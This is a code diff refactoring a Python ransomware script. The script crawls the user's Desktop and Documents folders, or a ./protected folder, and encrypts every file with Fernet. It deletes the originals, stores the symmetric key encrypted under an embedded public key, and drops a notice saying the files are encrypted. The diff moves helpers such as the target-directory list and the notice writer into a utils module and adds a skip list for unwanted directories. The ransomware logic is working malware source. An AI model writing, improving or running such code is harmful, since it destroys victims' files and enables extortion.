@@ -3,6 +3,7 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import serialization
 from cryptography.fernet import Fernet
+import utils
 import os
 
 PUBLIC_KEY = b"""
@@ -43,50 +44,29 @@ def encrypt_file(filepath, fernetobj):
         encrypted_file.write(encrypted_content)
         encrypted_file.close()
 
-def remove_file(filepath):
-    os.remove(filepath)
-
 def crawl(basedir):
     for path, curdir, files in os.walk(basedir):
+        for dir in utils.get_unwanted_directories():
+            try:
+                curdir.remove(dir)
+            except:
+                pass
         for file in files:
             filepath = os.path.join(path, file)
+            print(filepath)
             encrypt_file(filepath, f)
-            remove_file(filepath)
-
-def get_symkey_filepath():
-    keyfilepath = "./protected/sym.key" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/sym.key" 
-    return keyfilepath
+            utils.remove_file(filepath)
 
 def create_enc_key():
     encrypted_symmetric_key = encrypt_with_public_key(symkey, public_key)
-    with open(get_symkey_filepath(), "wb") as f:
+    with open(utils.get_symkey_filepath(), "wb") as f:
         f.write(encrypted_symmetric_key)
-
-def get_target_directories():
-    current_user = os.getlogin()
-    current_os = os.name
-    if current_os == "posix":
-        return ["./protected"]
-    else:
-        base_dir = f"C:/Users/{current_user}"
-        directories = []
-        subdirs = ["/Desktop", "/Documents"]
-        for subdir in subdirs:
-            directories.append(base_dir + subdir) 
-        return directories
-
-def drop_notice():
-    notice = "Your files are encrypted.\nSorry.\n:(\n"
-    filepath = "./protected/notice.txt" if os.name == "posix" else f"C:/Users/{os.getlogin()}/Desktop/notice.txt" 
-    encrypted_file = open(filepath, "w")
-    encrypted_file.write(notice)
-    encrypted_file.close()
 
 if __name__ == "__main__":
     public_key = load_public_key()
     symkey = Fernet.generate_key()
     f = Fernet(symkey)
-    for dir in get_target_directories():
+    for dir in utils.get_target_directories():
         crawl(dir)
     create_enc_key()
-    drop_notice()
+    utils.drop_notice()
